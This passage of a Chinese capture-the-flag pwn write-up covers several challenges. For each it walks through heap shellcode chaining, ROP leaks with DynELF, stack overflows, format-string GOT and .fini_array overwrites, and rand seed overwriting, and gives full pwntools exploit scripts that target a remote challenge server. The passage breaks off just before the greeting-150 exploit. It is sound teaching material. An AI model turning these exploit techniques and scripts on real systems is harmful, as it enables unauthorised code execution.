<p>这里又出现个问题就是，‘/bin/sh’太长，不能直接传递。需要利用函数的参数传递，首先将‘/bin/sh’写入一个chunk，然后free。这时候根据64位的参数传递规则，‘/bin/sh’作为free的参数传递给了rdi。</p>
<p>接下来需要解决的是在不同chunk间的跳转。使用jmp short(\xeb)实现短转移。需要知道之间的相对偏移。</p>
<p>上文分析过每个chunk依次申请，大小一致都是0x20.</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123231022120.png" alt="image-20201123231022120"></p>
<p>chunk的状态如图所示，为了统一方便计算。将jmp指令放在最后，不足的用用nop填充（\x90）。那么即从当前chunk的jmp区跳到下一个chunk的data区，距离是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">8+8+8（prevs_size+size+上个chunk的空）+1（一个未写入的空子节）&#x3D;0x19</span><br></pre></td></tr></table></figure>

<p><code>即跳转指令</code>\xeb\x19`。</p>
<p>最后就是得到free的got表项的地址相对于global的偏移。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125084832598.png" alt="image-20201125084832598"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125084904525.png" alt="image-20201125084904525"></p>
<p>偏移为<code>(0x0000000000202018-0x0000000002020A0)/8</code>得到-17.</p>
<p>所以得到exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./note-service2&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.133&quot;</span>,<span class="number">42169</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;size:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;8&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;content:&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"><span class="comment">#改写free的got</span></span><br><span class="line">add(<span class="number">-17</span>,asm(<span class="string">&quot;xor rsi,rsi&quot;</span>)+<span class="string">b&#x27;\x90\x90\xeb\x19&#x27;</span> )</span><br><span class="line">add(<span class="number">1</span>,asm(<span class="string">&quot;mov eax,0x3b&quot;</span>)+<span class="string">b&quot;\xeb\x19&quot;</span>)</span><br><span class="line">add(<span class="number">2</span>,asm(<span class="string">&quot;xor rdx,rdx&quot;</span>)+<span class="string">b&quot;\x90\x90\xeb\x19&quot;</span>)</span><br><span class="line">add(<span class="number">3</span>,asm(<span class="string">&quot;syscall&quot;</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123231554223.png" alt="image-20201123231554223"></p>
<h2 id="10-pwn-100"><a href="#10-pwn-100" class="headerlink" title="10.pwn-100"></a>10.pwn-100</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209110940322.png" alt="image-20201209110940322"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209164911452.png" alt="image-20201209164911452"></p>
<h3 id="代码分析-7"><a href="#代码分析-7" class="headerlink" title="代码分析"></a>代码分析</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209165235082.png" alt="image-20201209165235082"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209165320208.png" alt="image-20201209165320208"></p>
<p>整个程序很简单，只发现一个栈溢出漏洞，而且开启了堆栈不可执行。</p>
<h3 id="思路及利用-6"><a href="#思路及利用-6" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>思路显然就是利用栈溢出漏洞，编写gadget执行system。</p>
<p>首先需要泄露地址。这里可以借助pwntools的dynelf函数。</p>
<blockquote>
<p>DynELF是pwntools中专门用来应对无libc情况的漏洞利用模块.</p>
</blockquote>
<p>代码框架如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = process(<span class="string">&#x27;./xxx&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">address</span>):</span></span><br><span class="line">  <span class="comment">#各种预处理</span></span><br><span class="line">  payload = <span class="string">&quot;xxxxxxxx&quot;</span> + address + <span class="string">&quot;xxxxxxxx&quot;</span></span><br><span class="line">  p.send(payload)</span><br><span class="line">  <span class="comment">#各种处理</span></span><br><span class="line">  data = p.recv(<span class="number">4</span>)</span><br><span class="line">  log.debug(<span class="string">&quot;%#x =&gt; %s&quot;</span> % (address, (data <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>)))</span><br><span class="line">  <span class="keyword">return</span> data</span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">&quot;./xxx&quot;</span>))      <span class="comment">#初始化DynELF模块 </span></span><br><span class="line">systemAddress = d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)  <span class="comment">#在libc文件中搜索system函数的地址</span></span><br></pre></td></tr></table></figure>

<p>需要注意的是，DynELF需要能够泄露信息的漏洞反复触发，因此每一次泄露需要最终返回到start。</p>
<p>整个程序十分简单，能够用来输出的只有puts函数。给puts函数传参，需要用到<code>pop rdi，ret</code>这样的gadget。</p>
<p>使用ROPgadget查找。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209170839114.png" alt="image-20201209170839114"></p>
<p>得到需要的地址如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">poprdi = <span class="number">0x0000000000400763</span></span><br><span class="line">start = start_addr = <span class="number">0x400550</span></span><br></pre></td></tr></table></figure>



<p>最终得到如下的泄露函数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>		<span class="comment">#填充0x40+8位垃圾数据</span></span><br><span class="line">    payload += p64(poprdi)	<span class="comment">#覆盖ret，执行pop rdi，ret</span></span><br><span class="line">    payload += p64(addr)	<span class="comment">#addr——&gt;rdi</span></span><br><span class="line">    payload += p64(puts_plt)<span class="comment">#ret语句执行的地址，调用puts函数，相当于puts(addr)</span></span><br><span class="line">    payload += p64(start)	<span class="comment">#puts函数调用后的ret，返回开始。</span></span><br><span class="line">    payload = payload.ljust(<span class="number">200</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;bye~\n&quot;</span>)</span><br><span class="line">    up = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"> <span class="comment">#puts函数的接受处理</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"> <span class="comment">#由于接收完标志字符串结束的回车符后，就没有其他输出了，故先等待1秒钟，如果确实接收不到了，就说明输出结束了；以便与不是标志字符串结束的回车符（0x0A）混淆，这也利用了recv函数的timeout参数，即当timeout结束后仍得不到输出，则直接返回空字符串””</span></span><br><span class="line">        c = p.recv(numb = <span class="number">1</span>, timeout = <span class="number">0.5</span>)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> up == <span class="string">&#x27;\n&#x27;</span> <span class="keyword">and</span> c == <span class="string">&quot;&quot;</span>:</span><br><span class="line">            data = data[:<span class="number">-1</span>]</span><br><span class="line">            data += <span class="string">&quot;\x00&quot;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data += c</span><br><span class="line">            up = c</span><br><span class="line">    data = data[:<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">&#x27;./pwn-100&#x27;</span>))</span><br><span class="line">system = d.lookup(<span class="string">&#x27;__libc_system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>完成泄露system地址之后，就是执行system函数，传递“/bin/sh”参数得到shell了。</p>
<p>观察整个程序，并没有改写got的余地与必要。同时之前寻找<code>pop rdi，ret</code>时发现了足够的gadget。因此，考虑通过gadget传递参数执行system函数。</p>
<p>那么，第一步就是将‘/bin/sh’写入到内存的某个地方。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209172219756.png" alt="image-20201209172219756"></p>
<p>可以看到bss段是可写的，于是，利用read函数，将‘/bin/sh’写入bss段。</p>
<p>read函数一共有要三个传参寄存器rdi, rsi, rdx。</p>
<p>而在 libc_csu_init 中，有一段万能gadget。</p>
<p> <img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209173406970.png" alt="image-20201209173406970"></p>
<p>可以先传给r13，r14，r15再mov到相应寄存器。</p>
<p>于是又如下payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sh = <span class="number">0x601000</span></span><br><span class="line">gadget = <span class="number">0x40075a</span> <span class="comment"># pop rbx;pop rbp;pop r12;pop r13;pop r14;pop r15;ret</span></span><br><span class="line">gadget1 = <span class="number">0x400740</span> <span class="comment"># mov %r13,%rdx;mov %r14,%rsi;mov %r15d,%edi; callq  *(%r12,%rbx,8)</span></span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(gadget) </span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment"># rbx = 0</span></span><br><span class="line">payload += p64(<span class="number">1</span>)<span class="comment"># rbp = 1</span></span><br><span class="line">payload += p64(read_plt)<span class="comment"># r12 = read_got</span></span><br><span class="line">payload += p64(<span class="number">8</span>)<span class="comment"># r13 = 8,count;读入8个字节</span></span><br><span class="line">payload += p64(sh)<span class="comment"># r14 = sh,* buf = sh</span></span><br><span class="line">payload += p64(<span class="number">1</span>)<span class="comment"># r15 = 0,fd = 0;标准输入</span></span><br><span class="line">payload += p64(gadget1)</span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">56</span><span class="comment">#gadget11需要56个栈空间。</span></span><br><span class="line">payload += p64(start)</span><br><span class="line">payload = payload.ljust(<span class="number">200</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;bye~\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>至此完成了，‘/bin/sh’的输入，最后就是调用system函数。只需要将sh地址传给rdi调用system即可。</p>
<p>最终完整exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn-100&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">54991</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn-100&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">poprdi = <span class="number">0x0000000000400763</span></span><br><span class="line">start = start_addr = <span class="number">0x400550</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">    payload += p64(poprdi)</span><br><span class="line">    payload += p64(addr)</span><br><span class="line">    payload += p64(puts_plt)</span><br><span class="line">    payload += p64(start)</span><br><span class="line">    payload = payload.ljust(<span class="number">200</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;bye~\n&quot;</span>)</span><br><span class="line">    up = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        c = p.recv(numb = <span class="number">1</span>, timeout = <span class="number">0.5</span>)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> up == <span class="string">&#x27;\n&#x27;</span> <span class="keyword">and</span> c == <span class="string">&quot;&quot;</span>:</span><br><span class="line">            data = data[:<span class="number">-1</span>]</span><br><span class="line">            data += <span class="string">&quot;\x00&quot;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data += c</span><br><span class="line">            up = c</span><br><span class="line">    data = data[:<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf=elf)</span><br><span class="line">system = d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh = <span class="number">0x601000</span></span><br><span class="line">gadget = <span class="number">0x40075a</span> <span class="comment"># pop rbx;pop rbp;pop r12;pop r13;pop r14;pop r15;ret</span></span><br><span class="line">gadget1 = <span class="number">0x400740</span> <span class="comment"># mov %r13,%rdx;mov %r14,%rsi;mov %r15d,%edi; callq  *(%r12,%rbx,8)</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(gadget) </span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment"># rbx = 0</span></span><br><span class="line">payload += p64(<span class="number">1</span>)<span class="comment"># rbp = 1</span></span><br><span class="line">payload += p64(read_got)<span class="comment"># r12 = read_got</span></span><br><span class="line">payload += p64(<span class="number">8</span>)<span class="comment"># r13 = 8,count;读入8个字节</span></span><br><span class="line">payload += p64(sh)<span class="comment"># r14 = sh,* buf = sh</span></span><br><span class="line">payload += p64(<span class="number">1</span>)<span class="comment"># r15 = 0,fd = 0;标准输入</span></span><br><span class="line">payload += p64(gadget1)</span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">56</span></span><br><span class="line">payload += p64(start)</span><br><span class="line">payload = payload.ljust(<span class="number">200</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;bye~\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x48</span></span><br><span class="line">payload += p64(poprdi)</span><br><span class="line">payload += p64(sh)</span><br><span class="line">payload += p64(system)</span><br><span class="line">payload = payload.ljust(<span class="number">200</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209175028067.png" alt="image-20201209175028067"></p>
<h2 id="11-反应釜开关控制"><a href="#11-反应釜开关控制" class="headerlink" title="11.反应釜开关控制"></a>11.反应釜开关控制</h2><p><img src="/posts/5600bec/image-20201123091050404.png" alt="image-20201123091050404"></p>
<h3 id="代码分析-8"><a href="#代码分析-8" class="headerlink" title="代码分析"></a>代码分析</h3><p>先查看一下保护。</p>
<p><img src="/posts/5600bec/image-20201123091430114.png" alt="image-20201123091430114"></p>
<p>只开启了堆栈不可执行。</p>
<p><img src="/posts/5600bec/image-20201123091242758.png" alt="image-20201123091242758"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123231711816.png" alt="image-20201123231711816"></p>
<p><img src="/posts/5600bec/image-20201123091319181.png" alt="image-20201123091319181"></p>
<p><img src="/posts/5600bec/image-20201123091712759.png" alt="image-20201123091712759"></p>
<p>这道题感觉应该是不给附件中的可执行文件盲打才对，不然知道可执行文件用ida反编译，就知道是很就简单的栈溢出。通过三次栈溢出，覆盖返回地址跳转到后门函数。</p>
<h3 id="思路及利用-7"><a href="#思路及利用-7" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>首先保护只有堆栈不可执行。同时是使用gets函数获取输入。那么就可以随意的进行栈溢出。那么思路就很简单了。先通过栈溢出覆盖返回地址，从main跳到easy，从easy跳到normal，从normal跳到shell。</p>
<p>需要注意的是，ida显示的与rbp的距离有时候是不准确的，最好是通过gdb动态调试得到。这里为了方便，直接用来ida显示，成功得到shell。</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./reactionkettle&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">49151</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;is:&#x27;</span>)</span><br><span class="line">easy = p.recv(<span class="number">8</span>)</span><br><span class="line">easy =  <span class="built_in">int</span>(easy,<span class="number">16</span>) </span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x208</span>+p64(easy)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;is:&#x27;</span>)</span><br><span class="line">normal = p.recv(<span class="number">8</span>)</span><br><span class="line">normal  =  <span class="built_in">int</span>(normal,<span class="number">16</span>) </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x188</span>+p64(normal)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;is:&#x27;</span>)</span><br><span class="line">shell = p.recv(<span class="number">8</span>)</span><br><span class="line">shell = <span class="built_in">int</span>(shell,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span>+p64(shell)</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="12-实时数据监测"><a href="#12-实时数据监测" class="headerlink" title="12.实时数据监测"></a>12.实时数据监测</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125083325372.png" alt="image-20201125083325372"></p>
<p>checksec:</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125083521011.png" alt="image-20201125083521011"></p>
<h3 id="代码分析-9"><a href="#代码分析-9" class="headerlink" title="代码分析"></a>代码分析</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125083728103.png" alt="image-20201125083728103"></p>
<p>显然目标就是将key的值改为35795746，也就是0x02223322。这里有用到ida一个技巧，ida里字符串是以编码的值存储的，找到对应的值，选中，按下a就可以转为字符串显示。这里的”The location of key is %08x, and its value is %08x,not the 0x02223322. (╯°Д°)╯︵ ┻━┻\n”就是这样得来的。<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125084015380.png" alt="image-20201125084015380"></p>
<p>这显然是一个格式化字符串漏洞。</p>
<h3 id="思路及利用-8"><a href="#思路及利用-8" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>根据上述分析，只需要输入一个格式化字符串，将&amp;key改为0x02223322就可以。</p>
<p>那么首先，寻找格式化字符串的偏移。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125084321047.png" alt="image-20201125084321047"></p>
<p>可以看到偏移为12.</p>
<p>使用ida查询key的地址</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125084627078.png" alt="image-20201125084627078"></p>
<p>然后借助fmtstr_payload快速构造格式化字符串。<code>fmtstr_payload(12,&#123;0x804A048:0x02223322&#125;)</code></p>
<p>最终exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&quot;./实时数据监测&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">52658</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">12</span>,&#123;<span class="number">0x804A048</span>:<span class="number">0x02223322</span>&#125;)</span><br><span class="line">print(payload)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125084651226.png" alt="image-20201125084651226"></p>
<h2 id="13-dice-game"><a href="#13-dice-game" class="headerlink" title="13.dice_game"></a>13.dice_game</h2><p><img src="/posts/5600bec/image-20201123094300324.png" alt="image-20201123094300324"></p>
<h3 id="代码分析-10"><a href="#代码分析-10" class="headerlink" title="代码分析"></a>代码分析</h3><p>惯例先checksec一下</p>
<p><img src="/posts/5600bec/image-20201123094345375.png" alt="image-20201123094345375"></p>
<p>通过ida反编译阅读源码</p>
<p><img src="/posts/5600bec/image-20201123094603206.png" alt="image-20201123094603206"></p>
<p><img src="/posts/5600bec/image-20201123094616274.png" alt="image-20201123094616274"></p>
<p>可以看出，这是一个骰子游戏。连续猜对50次就可以得到flag。</p>
<p>通过分析栈可以知道，输入的name是可以覆盖掉seed的。</p>
<h3 id="思路及利用-9"><a href="#思路及利用-9" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>计算机的随机数都是伪随机数，种子一样时，rand函数会提供一样的数。所以需要控制seed的值。使用name覆盖seed。</p>
<p><strong>需要注意的是，由于exp使用python编写，但这里需要用到c的函数。需要用上一点混合编程的技巧。</strong></p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *  <span class="comment"># 提供了与 C 兼容的数据类型，并允许调用 DLL 或共享库中的函数。</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./dice_game&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">59063</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line"><span class="comment">#覆盖seed值为0</span></span><br><span class="line">name = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)</span><br><span class="line">p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;point(1~6): &quot;</span>)</span><br><span class="line">    <span class="comment">#混合编程，调用c的rand函数，rand的缺省时默认种子参数是0</span></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(libc.rand()%<span class="number">6</span>+<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行结果如下：</p>
<p><img src="/posts/5600bec/image-20201123095347070.png" alt="image-20201123095347070"></p>
<h2 id="14-satck2"><a href="#14-satck2" class="headerlink" title="14.satck2"></a>14.satck2</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209180156575.png" alt="image-20201209180156575"></p>
<h2 id="16-greeting-150"><a href="#16-greeting-150" class="headerlink" title="16.greeting-150"></a>16.greeting-150</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125094546610.png" alt="image-20201125094546610"></p>
<p>首先checksec</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201204833485.png" alt="image-20201201204833485"></p>
<h3 id="代码分析-11"><a href="#代码分析-11" class="headerlink" title="代码分析"></a>代码分析</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201205229762.png" alt="image-20201201205229762"></p>
<p>sprintf函数的作用是，将v5的内容按照format拼接到“Nice to meet you,%s：）”中。之后的返回值调用printf函数，显然这里存在的是格式化字符串漏洞。</p>
<h3 id="思路及利用-10"><a href="#思路及利用-10" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>要利用这个格式化字符串漏洞，首先需要找到字符串的偏移。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209085535031.png" alt="image-20201209085535031"></p>
<p>可以看出输如的aaaa并没有在一个偏移内，需要填充两个字符。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209085719874.png" alt="image-20201209085719874"></p>
<p>对于aaaa来说，偏移是12.知道偏移后，就可以用格式化字符串漏洞做到任意地址的读写。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209090009791.png" alt="image-20201209090009791"></p>
<p>注意到程序中有调用system函数，那么只需要修改某个got为system函数的plt就可以调用system函数了。</p>
<p>考虑到传参的问题，这个被修改的got最好能获得输入。于是在输入函数中发现strlen函数比较适合。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209090448566.png" alt="image-20201209090448566"></p>
<p>只要修改strlen函数的got为system的plt，再想办法返回main重新输入”/bin/sh”就可以得到shell了。</p>
<p>接下来就是如何返回main的问题。</p>
<p><code>.fini_array</code> 节存放了指向终止代码的函数指针，在main函数调用后被触发。所以把.fini_array[0]改为mian的地址即可。</p>
<p>在ida中使用快捷键ctrl+s可以看到fini_array的地址。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209091546640.png" alt="image-20201209091546640"></p>
<p>同时也可以得到如下地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fini_got &#x3D; 0x8049934  </span><br><span class="line">main_addr &#x3D; 0x80485ED  </span><br><span class="line">strlen_got &#x3D; 0x8049A54  </span><br><span class="line">system_plt &#x3D; 0x8048490 </span><br></pre></td></tr></table></figure>

<p>由于可输入的只有64字节。格式化字符串需要设计一下。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209092156695.png" alt="image-20201209092156695"></p>
<p>可以看到，fini_array的内容的地址与main只有两个字节不一样。只需要修改后两个字节，用到格式化字符<code>%hn</code>.</p>
<p>strlen的GOT表内容，四个字节我们都需要修改，我们拆分为2个2字节写。因此，我们一共需要写三个：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">arr &#x3D; [  </span><br><span class="line">   0x85ED,  </span><br><span class="line">   0x8490,0x804  </span><br><span class="line">]  </span><br></pre></td></tr></table></figure>

<p>由于是小端序，因此，我们要在fini_got写入2字节数据arr[0]；在strlen_got写入2字节数据arr[2]，在strlen_got+2处写入2字节数据arr[1]。</p>
<p>exp如下：</p>
